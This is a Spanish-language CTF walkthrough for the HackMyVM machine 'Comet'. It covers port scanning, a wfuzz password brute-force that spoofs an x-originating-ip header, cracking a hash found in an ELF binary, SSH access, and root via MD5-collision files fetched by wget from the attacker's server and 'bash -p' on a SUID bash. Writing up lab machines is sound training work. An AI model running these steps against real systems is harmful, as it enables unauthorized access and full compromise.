# Máquina Comet
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

tenía dominio comet.hmv y lo agregué al /etc/hosts

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.27

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 10.0.2.27

![alt text](image-2.png)

### Fuzzing Web

feroxbuster --url http://comet.hmv/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

entramos a la web en login.php

![alt text](image-4.png)

### Explotación

Apunté al login.php y lancé el siguiente comando con wfuzz con bypass.

wfuzz -u 'http://comet.hmv/login.php' -d 'username=admin&password=FUZZ' -H 'x-originating-ip:1.2.3.4' -z file,/usr/share/wordlists/rockyou.txt --hc 200 -t 100 -c -v

![alt text](image-5.png)

Inicié sesión y encontré lo siguiente:

![alt text](image-6.png)

los descargué, en el archivo firewall.log.37 encontré el nombre de usuario joe y el archivo firewall_update se trata de un archivo ELF entonces procedí a verificarlo con GHidra

archivo firewa.log.37

![alt text](image-7.png)

archivo ELF firewall_update

![alt text](image-8.png)

en la función main encontré un hash, analizando el hash con hash-identifier:

![alt text](image-9.png)

crackeo con jhontheripper:

![alt text](image-10.png)

me conecté por ssh con el usuario joe y la contraseña encontrada:

![alt text](image-11.png)

### Escalar privilegios

Ejecuté el comando sudo -l

![alt text](image-12.png)

visualizando el script /home/joe/coll

![alt text](image-13.png)

Este script verifica dos archivos y, si cumplen ciertas condiciones, establece el bit SUID en /bin/bash

pasos para ser root:

En kali:

descargamos la herramienta de github:
git clone https://github.com/zhijieshi/md5collgen.git

herramienta para generar hashes MD5 2 iguales en 2 archivos diferentes

cd md5collgen

make

sudo cp md5collgen /usr/local/bin

echo 'HMV' > tmp

md5collgen tmp -o file1 file2


python3 -m http.server 80

En víctima:

en el /home/joe

wget http://10.0.2.15/file1
wget http://10.0.2.15/file2

ejecuto:

sudo /bin/bash /home/joe/coll

bash -p

listo soy root

![alt text](image-14.png)

### user.txt

![alt text](image-15.png)

### root.txt

![alt text](image-16.png)